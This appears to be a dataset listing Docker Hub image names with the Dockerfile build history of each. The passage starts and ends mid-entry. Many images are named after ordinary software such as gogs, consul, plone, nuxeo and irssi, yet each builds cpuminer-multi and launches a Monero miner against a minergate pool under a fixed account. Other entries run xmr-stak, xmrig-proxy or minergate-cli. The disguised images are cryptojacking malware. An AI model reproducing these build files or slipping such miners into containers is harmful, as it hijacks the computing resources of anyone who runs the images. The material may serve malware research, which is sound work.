/etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ziewebidega/gogs; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
zuproingcf/consul; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
zevakocgeronracom/next; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
zixomorsincom/notifier; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
zidofhostlabacom/plone; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
genrppetwcom2/ros; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly2@outlook.com -p x -t 1"]'
inm50mbml/nuxeo; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly2@outlook.com -p x -t 1"]'
ibnrtvchdcom/irssi; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly2@outlook.com -p x -t 1"]'
ferofe/maochi; b'ADD file:f0b8eaa718bc3965b1e8395f5a6bea97c16651b50614e676bb3eaf31335a0045 /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nENV ADDR=88LWejQex7AQuyyT5DavSmemh3wGCmqWejE9ZPEZ64dm3gJgXgxhrwH6QdA4DACqErfn11ZANjJEdN8LKAUqiZdvNwg4vSa\nCOPY dir:bd1c9d6550a4afc31a842184aada632093390d1fb8b66df17bbabf0bcc98883a /xmr-stak\nCMD ["/bin/sh -c cd /xmr-stak && sh ./start.sh  ${ADDR}"]'
dolphyvn/mr-proxy; b'ADD file:529264c6593975a61f31e017eaf2e33d9ef126bde387f5d4136c60cf010a7383 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /root/\nCOPY file:b18166be0169cf639eabccd16ea282dac16c3ce2fd31071ca701f9a5896bd88a /root/\nCOPY file:fc312bacf7f111262cd9bd2a5dfd3387d5496d5e4654007095ab2b8d07173ecf /root/\nCOPY file:6504bc42a4827e4d816d79c976d83f3f0410406352ae227a80183d2b8f449037 /root/\nCOPY file:d302af587b3300cece5ee867347bf9fef8b76e612847bd72c4c96d2cd199ea2c /root/\nCMD ["/root/xmrig-proxy"]'
miccarr/dash; b'ADD file:1e105449468a2d88e99909d47bb68f49b2da9303f9f5289721720b3a30308f8e /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         ca-certificates         wget     && rm -r /var/lib/apt/lists/*\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli     && dpkg -i *.deb     && rm *.deb\nRUN useradd -m miccarr@me.com\nUSER miccarr@me.com\nCMD ["/bin/sh -c minergate-cli -user miccarr@me.com -fcn+xmr"]'
geeta/test; b'ADD file:d37ff24540ea7700d0fc053e1996b234428a88f3a324d7fcbd83d8ef95318040 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nENV MINERGATE_INSTALL=https://minergate.com/download/deb-cli\nENV USERNAME=user@email.com\nENV CURRENCY=eth\nENV CORES=2\nRUN apt-get update &&  apt-get install -y  ca-certificates  wget  curl  libpcre3-dev  libxcb1\nRUN curl -o \t/tmp/minergate-cli-release.deb -L \t"$MINERGATE_INSTALL" &&     dpkg -i /tmp/minergate-cli-release.deb &&     apt-get -y autoremove &&     apt-get -y clean &&     rm -rf /var/lib/apt/lists/* &&     rm -rf /tmp/* &&     rm -rf /var/tmp/*\nENTRYPOINT ["minergate-cli --user"]\nCMD ["uchauhan@gmail.com --xmr 1"]'
unrealord/mg; b'ADD file:39d3593ea220e686d5450244ef9dd6c934e3b288a29212d332ec33942b7bf218 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache 